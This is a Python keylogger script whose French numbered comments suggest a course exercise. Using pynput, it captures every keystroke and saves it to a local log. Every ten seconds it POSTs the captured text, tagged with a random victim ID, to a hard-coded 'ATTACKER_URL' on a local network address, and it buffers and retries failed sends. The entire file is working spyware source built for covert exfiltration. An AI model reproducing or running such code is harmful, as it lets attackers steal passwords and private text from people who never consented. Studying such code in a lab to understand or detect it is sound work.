import pynput
import pynput.keyboard
import threading
import os
import uuid
import json
import datetime
from urllib import request, error


# 10.1. Déclarez une variable globale log de type string
log = ""

# 11.2. Déclarer une variable globale path de type os.path
path = os.path.join(os.getcwd(), "log.txt")

# Exfiltration configuration
ATTACKER_URL = "http://192.168.1.25:5000/logs"
victim_id = str(uuid.uuid4())
PENDING_BUFFER = os.path.join(os.getcwd(), "pending.jsonl")


# 11.3. Déclarer une fonction report() pour sauvegarder les caractères dans le fichier log
def report():
    # 11.3.1. Déclarer les deux variables globales log et path
    global log, path

    # 11.3.2. Créer une variable logfile = open(path, "a")
    if log:  # Only write if log is not empty
        # Local write (optional artifact)
        with open(path, "a", encoding="utf-8") as logfile:
            logfile.write(log)
        # Prepare JSON payload
        payload = {
            "victim_id": victim_id,
            "timestamp": datetime.datetime.now().isoformat(timespec='seconds'),
            "data": log,
        }
        # Try network exfiltration; if fails, buffer locally
        _send_or_buffer(payload)
        # Clear log after sending
        log = ""

    # Schedule the next report in 10 seconds
    # Try to flush any buffered payloads
    _flush_buffer()
    # Schedule next run
    timer = threading.Timer(10, report)
    timer.daemon = True
    timer.start()


def _send_or_buffer(payload: dict):
    data_bytes = json.dumps(payload).encode('utf-8')
    req = request.Request(ATTACKER_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
    try:
        with request.urlopen(req, timeout=3) as resp:
            resp.read()  # consume
    except Exception:
        # Buffer to local file on any failure
        with open(PENDING_BUFFER, 'a', encoding='utf-8') as f:
            f.write(json.dumps(payload) + "\n")


def _flush_buffer():
    if not os.path.exists(PENDING_BUFFER):
        return
    try:
        # Attempt to resend buffered lines
        remaining = []
        with open(PENDING_BUFFER, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    payload = json.loads(line)
                    data_bytes = json.dumps(payload).encode('utf-8')
                    req = request.Request(ATTACKER_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
                    with request.urlopen(req, timeout=3) as resp:
                        resp.read()
                except Exception:
                    remaining.append(line)
        # Rewrite remaining unsent
        if remaining:
            with open(PENDING_BUFFER, 'w', encoding='utf-8') as f:
                for line in remaining:
                    f.write(line + "\n")
        else:
            # Remove buffer if empty
            os.remove(PENDING_BUFFER)
    except Exception:
        # Leave buffer as-is on unexpected errors
        pass


# Créer la méthode processkeys(key) qui prend comme paramètre une touche du clavier sur laquelle on a appuyé, affiche sa valeur.
def processkeys(key):
    global log  # Permet de modifier la variable globale
    
    # 10.3. On utilise try...except car key.char n'existe que pour les caractères normaux
    try:
        # 10.2. Pour chaque touche pressée, concaténer le caractère dans la variable log
        log += key.char
    except AttributeError:
        # 10.4. Gérer les espaces, retours chariot et backspaces
        if key == pynput.keyboard.Key.space:
            log += " "
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
        elif key == pynput.keyboard.Key.backspace:
            # Supprimer le dernier caractère
            log = log[:-1]
        else:
            pass  # Ne rien ajouter au log

# 6.1. Déclarez une variable keyboard_listener qui va contenir le résultat de l'appel de la fonction pynput.keyboard.Listener()
keyboard_listener = pynput.keyboard.Listener(on_press=processkeys)


# Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.
def start_keylogger():   
    # 7. Ajouter les lignes de code suivantes
    report()  # Start periodic reporting
    with keyboard_listener:
        keyboard_listener.join()


if __name__ == "__main__":
    start_keylogger()